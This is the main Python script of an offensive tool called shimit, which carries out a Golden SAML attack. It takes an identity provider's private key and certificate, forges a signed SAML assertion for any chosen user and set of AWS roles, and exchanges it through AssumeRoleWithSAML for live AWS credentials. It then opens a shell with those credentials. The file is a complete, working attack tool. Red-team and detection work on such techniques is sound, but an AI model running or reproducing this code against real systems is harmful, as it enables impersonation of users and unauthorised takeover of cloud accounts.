# coding: utf-8
'''
Main module to perform a Golden SAML attack.

Execution flow:
    - Parse arguments from the user
    - Build the assertion and the SAMLResponse
    - Sign the Assertion
    - Use the SAMLResponse to open a session with the SP
    - Apply the session for the user to use
'''

# Imports
import argparse
import lxml.etree as etree
from base64 import b64encode
from aws import AWS

TOOL_DESCRIPTION = u'''
              ██╗   ███████╗██╗  ██╗██╗███╗   ███╗██╗████████╗     ██╗ ██╗  
             ██╔╝   ██╔════╝██║  ██║██║████╗ ████║██║╚══██╔══╝    ██╔╝ ╚██╗ 
            ██╔╝    ███████╗███████║██║██╔████╔██║██║   ██║      ██╔╝   ╚██╗
            ╚██╗    ╚════██║██╔══██║██║██║╚██╔╝██║██║   ██║     ██╔╝    ██╔╝
             ╚██╗   ███████║██║  ██║██║██║ ╚═╝ ██║██║   ██║    ██╔╝    ██╔╝ 
              ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝   ╚═╝    ╚═╝     ╚═╝  
                                                                   
shimit is a tool that implements a Golden SAML attack. It allows the user to create a signed \n\
SAMLResponse object, and use it to open a session in the Service Provider.
'''

def exit_print_usage(arg_parser):
    '''
    Print usage and quit.
    :param arg_parser: argparse argument parser
    '''
    arg_parser.print_help()
    arg_parser.exit()


def get_args():
    '''
    Handle arguments using argparse
    :return: list of arguments
    '''

    arg_parser = argparse.ArgumentParser(description=TOOL_DESCRIPTION,
                                         formatter_class=lambda prog: argparse.RawDescriptionHelpFormatter(prog, width=100))

    arg_parser.add_argument("-pk", "--PrivateKey",
                            action="store",
                            dest="key",
                            required=not "--LoadFile",
                            help="Private key file full path (pem format)")

    arg_parser.add_argument("-c", "--Certificate",
                            action="store",
                            dest="cert",
                            help="Certificate file full path (pem format)")

    arg_parser.add_argument("-sp", "--ServiceProvider",                        
                            action="store",
                            dest="sp",
                            default="https://signin.aws.amazon.com/saml",
                            help="Service probider URL e.g. \
                            https://signin.aws.amazon.com/saml")

    arg_parser.add_argument("-idp", "--IdentityProvider",
                            action="store",
                            dest="idp",
                            required=not "--LoadFile",
                            help="Identity Provider URL e.g. \
                            http://server.domain.com/adfs/services/trust")

    arg_parser.add_argument("-u", "--Username",
                            action="store",
                            dest="user",
                            required=not "--LoadFile",
                            help="User and domain name e.g. domain\\username (use \\\\ or quotes in *nix)")

    arg_parser.add_argument("-reg", "--Region",
                            action="store",
                            dest="region",
                            default="us-east-1",
                            help="AWS region. Default is us-east-1")

    arg_parser.add_argument("--SessionValidity",
                            action="store",
                            dest="session_validity",
                            default=60,
                            help="Time for session validity (in minutes)")

    arg_parser.add_argument("--SamlValidity",
                            action="store",
                            dest="saml_validity",
                            default=5,
                            help="Time for SAMLRequest validity (in minutes)")

    arg_parser.add_argument("-n", "--RoleSessionName",
                            action="store",
                            dest="session_name",
                            required=not "--LoadFile",
                            help="Session name in AWS")

    arg_parser.add_argument("-r", "--Roles",
                            action="append",
                            dest="roles",
                            required=not "--LoadFile",
                            help="Desired roles in AWS. Supports Multiple \
                            roles, the first one specified will be assumed.")

    arg_parser.add_argument("-id", "--AwsId",
                            action="store",
                            dest="arn",
                            required=not "--LoadFile",
                            help="AWS account id e.g. 123456789012")

    arg_parser.add_argument("-o", "--OutputFile",
                            action="store",
                            dest="out_file",
                            help="Output encoded SAMLResponse to a specified file path")

    arg_parser.add_argument("-l", "--LoadFile",
                            action="store",
                            dest="load_file",
                            help="Load SAMLResponse from a specified file path")

    arg_parser.add_argument("-t", "--CreationTime",
                            action="store",
                            dest="time",
                            default=None,
                            help="Timestamp for creating the SAML Response (UTC). The validity \
                            period will be relative to this time. Defualt is current time. Format \"00:00 1.1.1970\"")

    args = arg_parser.parse_args()

    # Check if args are valid
    if not args.load_file:
        # Check if the DOMAIN\USER is valid
        if args.user and args.roles and args.key and args.cert:
            if len(args.user.split('\\')) != 2:
                exit_print_usage(arg_parser)
        else:
            exit_print_usage(arg_parser)

    # Return arguments
    return args


def main():
    ''' Gets arguments from the user, sign a SAML response and opens a session with the generated AccessKey.
        Mandatory parameters are: 
    '''

    # Parse Arguments
    args = get_args()

    # Check if the user provided file to load from
    if args.load_file:
        print "[+] Loading SAMLResponse from file..."
        saved_response = open(args.load_file, "r").read()
        arn, role_name = AWS.load(saved_response)
        aws_session_token = AWS.assume_role(
            AWS.TEMPLATES['role_arn'].format(arn=arn, role=role_name),
            AWS.TEMPLATES['principal_arn'].format(arn=arn),
            saved_response)

        # Open shell with the session
        AWS.apply_cli_session(aws_session_token["Credentials"], args.region)
        return
        
    # Set time parameters for assertion
    time = AWS.gen_timestamp(base_time=args.time)
    saml_expiration = AWS.gen_timestamp(base_time=args.time, minutes=int(args.saml_validity))
    session_expiration = AWS.gen_timestamp(base_time=args.time, minutes=int(args.session_validity))

    # Create the assertion
    print "[+] Creating the assertion"
    root = AWS.create_assertion(
        time,
        args.idp,
        args.user,
        saml_expiration,
        args.sp,
        session_expiration,
        args.session_name,
        args.roles,
        args.arn)

    # Sign the assertion
    print "[+] Signing the assertion with the private key provided"
    signed_root = AWS.sign_assertion(root, args.key, args.cert)

    # Insert signed assertion to saml response
    saml_response = AWS.TEMPLATES["response"].format(
        id=AWS.gen_id(),
        issue_instant=time,
        issuer=args.idp,
        assertion=etree.tostring(signed_root)
    )

    # Encode the saml response with B64
    encoded_response = b64encode(saml_response)

    # Check if the user provided file to export to
    if args.out_file:
        print "[+] Writing the SAMLResponse to file: %s" % args.out_file
        with open(args.out_file, "w") as out_file:
            out_file.write(encoded_response)        
        # Exit
        return

    # Assume role and get session token
    print "[+] Calling AssumeRoleWithSAML API"
    aws_session_token = AWS.assume_role(
        AWS.TEMPLATES['role_arn'].format(arn=args.arn, role=args.roles[0]),
        AWS.TEMPLATES['principal_arn'].format(arn=args.arn),
        encoded_response)

    # Open shell with the session
    print "[+] Opening a shell"
    AWS.apply_cli_session(aws_session_token["Credentials"], args.region)

if __name__ == "__main__":
    main()
